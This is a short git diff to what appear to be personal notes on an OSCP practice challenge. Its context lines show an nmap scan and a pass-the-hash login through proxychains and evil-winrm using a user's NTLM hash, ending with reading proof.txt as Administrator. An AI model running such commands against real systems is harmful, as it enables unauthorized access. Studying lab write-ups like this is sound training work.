@@ -9,7 +9,6 @@ Please feel free to complete this challenge at your own pace. While the OSCP exa
 
 We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.
 
-# 
 sudo nmap -T4 -A 192.168.242.141-145
 [ip-scanning.md]
 
@@ -311,3 +310,4 @@ proxychains -q evil-winrm -i 10.10.202.140 -u tom_admin -H 4979d69d4ca66955c075c
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
 
+# Thats all for the flag 
